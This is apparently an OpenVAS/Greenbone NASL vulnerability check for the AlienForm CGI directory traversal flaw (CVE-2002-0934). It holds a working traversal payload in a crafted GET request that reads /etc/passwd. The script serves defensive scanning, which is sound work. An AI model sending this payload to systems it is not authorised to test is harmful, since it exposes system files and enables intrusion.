# SPDX-FileCopyrightText: 2002 Andrew Hintz (http://guh.nu)
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11027");
  script_version("2025-07-18T15:43:33+0000");
  script_tag(name:"last_modification", value:"2025-07-18 15:43:33 +0000 (Fri, 18 Jul 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_cve_id("CVE-2002-0934");
  script_name("AlienForm CGI Script Directory Traversal Vulnerability (Jun 2002) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2002 Andrew Hintz (http://guh.nu)");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "os_detection.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  # nb: Initial version of this VT only checked /etc/passwd which indicates that this product is
  # only running on Linux. As it doesn't make much sense to throw these checks against every OS
  # these days a more Linux specific mandatory key is used here.
  script_mandatory_keys("Host/runs_unixoide");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210121155052/http://www.securityfocus.com/bid/4983");
  # nb: No archive.org link available but kept for tracking purpose
  script_xref(name:"URL", value:"http://online.securityfocus.com/archive/1/276248/2002-06-08/2002-06-14/0");

  script_tag(name:"summary", value:"The AlienForm CGI script is prone to a directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The AlienForm CGI script allows an attacker to view any file on
  the target computer, append arbitrary data to an existing file, and write arbitrary data to a new
  file.

  The AlienForm CGI script is installed as either af.cgi or alienform.cgi

  For more details, please see the references.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

files = make_list( "/af.cgi", "/alienform.cgi" );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  foreach file( files ) {

    # nb: No traversal_files() for now as we don't want to change the code below as we don't have
    # access to an affected system anymore and can't test any changes done here.
    url = dir + file + "?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd";

    if( http_vuln_check( port:port, url:url, pattern:".*root:.*:0:[01]:.*" ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
